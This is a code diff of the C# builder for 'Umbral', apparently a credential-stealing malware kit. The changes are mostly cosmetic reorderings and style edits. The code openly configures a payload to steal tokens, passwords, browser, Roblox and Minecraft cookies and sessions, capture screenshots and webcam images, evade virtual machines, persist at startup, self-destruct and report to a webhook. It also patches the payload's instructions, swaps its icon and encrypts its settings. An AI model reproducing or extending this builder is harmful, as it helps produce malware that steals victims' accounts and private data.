@@ -1,11 +1,11 @@
-﻿using Jose;
-using Mono.Cecil.Cil;
-using Mono.Cecil;
-using System;
+﻿using System;
 using System.IO;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
+using Jose;
+using Mono.Cecil;
+using Mono.Cecil.Cil;
 using Mono.Cecil.Rocks;
 using Vestris.ResourceLib;
 
@@ -30,24 +30,24 @@ namespace Umbral.builder.Build
     {
         private const string Version = "v1.1";
         private const string PayloadFile = "Umbral.payload";
-
-        public string Output;
-        public string Webhook;
-        public string IconPath;
-
-        public bool Ping;
         public bool AntiVm;
-        public bool Startup;
-        public bool StealTokens;
-        public bool StealPasswords;
-        public bool StealCookies;
-        public bool StealRobloxCookies;
-        public bool StealMinecraftSession;
-        public bool CaptureScreenshot;
-        public bool SelfDestruct;
-        public bool CaptureWebcam;
 
         public AssemblyInfo AssemblyInformation;
+        public bool CaptureScreenshot;
+        public bool CaptureWebcam;
+        public string IconPath;
+
+        public string Output;
+
+        public bool Ping;
+        public bool SelfDestruct;
+        public bool Startup;
+        public bool StealCookies;
+        public bool StealMinecraftSession;
+        public bool StealPasswords;
+        public bool StealRobloxCookies;
+        public bool StealTokens;
+        public string Webhook;
 
         public bool Build(TextBox textBox)
         {
@@ -64,6 +64,7 @@ namespace Umbral.builder.Build
 
             try
             {
+
                 #region ModifyInstructions
 
                 string tempFile = GenerateRandomString(10) + ".tmp";
@@ -191,6 +192,7 @@ namespace Umbral.builder.Build
 
                 if (File.Exists(IconPath) && IconPath.ToLower().EndsWith(".ico") && File.Exists(tempFile))
                 {
+
                     #region ModifyIcon
 
                     textBox.AppendText("\r\nApplying icon...");
@@ -199,6 +201,7 @@ namespace Umbral.builder.Build
                     iconDirectoryResource.SaveTo(tempFile);
 
                     #endregion
+
                 }
 
                 if (File.Exists(Output))
@@ -224,19 +227,19 @@ namespace Umbral.builder.Build
             return false;
         }
 
-        private static string GenerateRandomString(int length)
+        static private string GenerateRandomString(int length)
         {
-            var random = new Random();
-            var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-            var result = new StringBuilder();
+            Random random = new Random();
+            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            StringBuilder result = new StringBuilder();
 
-            for (var i = 0; i < length; i++)
+            for (int i = 0; i < length; i++)
                 result.Append(chars[random.Next(0, chars.Length)]);
 
             return result.ToString();
         }
 
-        private static string Encrypt(string value, byte[] key, byte[] iv)
+        static private string Encrypt(string value, byte[] key, byte[] iv)
         {
             byte[][] structure = AesGcm.Encrypt(key, iv, null, Encoding.UTF8.GetBytes(value));
 
